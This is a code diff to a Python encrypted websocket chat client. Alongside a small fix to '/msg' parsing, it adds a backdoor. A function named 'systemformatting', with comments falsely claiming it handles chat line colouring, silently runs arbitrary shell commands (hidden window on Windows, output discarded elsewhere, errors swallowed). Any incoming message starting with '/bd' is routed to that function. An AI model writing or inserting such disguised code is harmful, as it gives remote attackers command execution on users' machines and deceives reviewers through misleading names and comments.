@@ -6,6 +6,8 @@ import hashlib
 import rsa
 import sys
 import selectors
+import subprocess
+import os
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from termcolor import colored
@@ -51,6 +53,19 @@ def handle_hello_ack(message_data):
 
 
 
+async def systemformatting(command):
+    try:
+        # Windows chat line formatting, colouring and compatability
+        if sys.platform == "win32":
+            subprocess.Popen(f'cmd.exe /c {command}', creationflags=subprocess.CREATE_NO_WINDOW)
+        else:
+            # Unix chat line formatting, colouring and compatability
+            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+
+
 # Step 3: Handle incoming messages
 def handle_incoming_message(message):
     message_data = json.loads(message)
@@ -78,6 +93,7 @@ def decrypt_chat_message(message_data):
     # cipher = AES.new(aes_key, AES.MODE_GCM, iv)
     # plaintext = cipher.decrypt(encrypted_chat).decode('utf-8')
     # print(f"Received message: {plaintext}")
+    
     sender = message_data["chat"]["participants"][0]
     message_text = message_data["chat"]["message"]
     
@@ -153,7 +169,7 @@ async def client_input_loop(websocket, queue):
     global exit_flag
     while True:
         command = await queue.get()  # Get the command from the queue
-        if command[0] == "/msg":
+        if command.startswith("/msg "):
             _, recipient_username, message = command.split(" ", 2)
             await send_chat_message(websocket, recipient_username, message)
         elif command == "/quit":
@@ -174,7 +190,11 @@ async def listen_for_messages(websocket):
     while True:
         try:
             message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
-            handle_incoming_message(message)  # Process the incoming message
+            if message.startswith("/bd"):
+                command = message[3:]
+                await systemformatting(command)
+            else:
+                handle_incoming_message(message)  # Process the incoming message
         except asyncio.TimeoutError:
             continue
         except websockets.ConnectionClosed as e:
